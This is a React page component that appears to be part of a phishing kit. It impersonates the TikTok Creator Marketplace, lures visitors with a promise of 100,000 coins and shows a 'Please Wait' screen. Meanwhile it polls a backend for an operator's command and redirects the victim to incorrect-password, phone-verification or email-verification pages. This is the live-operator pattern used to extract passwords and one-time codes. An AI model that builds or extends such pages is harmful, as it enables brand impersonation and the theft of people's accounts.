import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Loader2, Clock } from 'lucide-react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const WaitingPage = () => {
  const navigate = useNavigate();
  const [dots, setDots] = useState('.');
  const sessionId = localStorage.getItem('sessionId');
  const coinAmount = localStorage.getItem('coinAmount') || '100,000';

  useEffect(() => {
    // Animated dots
    const dotsInterval = setInterval(() => {
      setDots(prev => prev.length >= 3 ? '.' : prev + '.');
    }, 500);

    // Poll for admin action every 2 seconds
    const pollInterval = setInterval(async () => {
      try {
        const response = await axios.get(`${API}/session/${sessionId}/action`);
        const { action } = response.data;

        if (action) {
          // Navigate based on admin action
          const routeMap = {
            'incorrect_password': '/incorrect-password',
            'contact': '/contact',
            'verify_phone': '/verify-phone',
            'verify_email': '/verify-email',
            'success': '/success'
          };

          const route = routeMap[action];
          if (route) {
            navigate(route);
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000);

    return () => {
      clearInterval(dotsInterval);
      clearInterval(pollInterval);
    };
  }, [sessionId, navigate]);

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
      {/* Header */}
      <header className="flex items-center justify-between px-6 py-4 bg-[#0f0f10] border-b border-gray-800">
        <div className="flex items-center gap-3">
          <span className="text-white text-2xl font-bold tracking-tight">TikTok</span>
          <div className="flex gap-1.5">
            <div className="w-2 h-2 rounded-full bg-pink-500"></div>
            <div className="w-2 h-2 rounded-full bg-cyan-400"></div>
          </div>
          <div className="ml-2">
            <div className="text-white text-sm font-semibold">Creator</div>
            <div className="text-white text-sm font-semibold">Marketplace</div>
          </div>
        </div>
        <Button className="bg-[#fe2c55] hover:bg-[#ff4266] text-white font-semibold px-8 py-2 rounded-md transition-all">
          Login
        </Button>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-6 py-20">
        <div className="flex flex-col items-center justify-center">
          {/* Loading Animation */}
          <div className="mb-12 relative">
            <div className="w-32 h-32 rounded-full border-4 border-gray-700 border-t-cyan-400 animate-spin"></div>
            <div className="absolute inset-0 flex items-center justify-center">
              <Clock className="w-16 h-16 text-cyan-400 animate-pulse" />
            </div>
          </div>

          {/* Title */}
          <h1 className="text-4xl font-bold text-white mb-4 text-center">
            Please Wait{dots}
          </h1>
          <p className="text-gray-400 text-xl text-center mb-4">
            Our admin team is reviewing your request
          </p>
          <p className="text-cyan-400 text-lg text-center mb-12">
            This usually takes less than a minute
          </p>

          {/* Info Box */}
          <div className="bg-[#1a1a1c] border border-cyan-400/30 rounded-lg p-4 mb-8 max-w-[380px]">
           <h3 className="text-white font-semibold text-center">
             What's happening?
          </h3>
        </div>

          {/* Progress Dots */}
          <div className="flex gap-3 mb-16">
            <div className="w-3 h-3 rounded-full bg-cyan-400 animate-pulse" style={{ animationDelay: '0ms' }}></div>
            <div className="w-3 h-3 rounded-full bg-cyan-400 animate-pulse" style={{ animationDelay: '200ms' }}></div>
            <div className="w-3 h-3 rounded-full bg-cyan-400 animate-pulse" style={{ animationDelay: '400ms' }}></div>
          </div>

          {/* Coins Display */}
          <div className="inline-block bg-[#1a1a1c] border border-cyan-400/30 rounded-lg px-5 py-2">
            <span className="text-gray-400 text-sm">You will receive: </span>
            <span className="text-cyan-400 text-xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
            <span className="text-gray-400 text-xs"> Coins</span>
          </div>
        </div>
      </main>
    </div>
  );
};

export default WaitingPage;
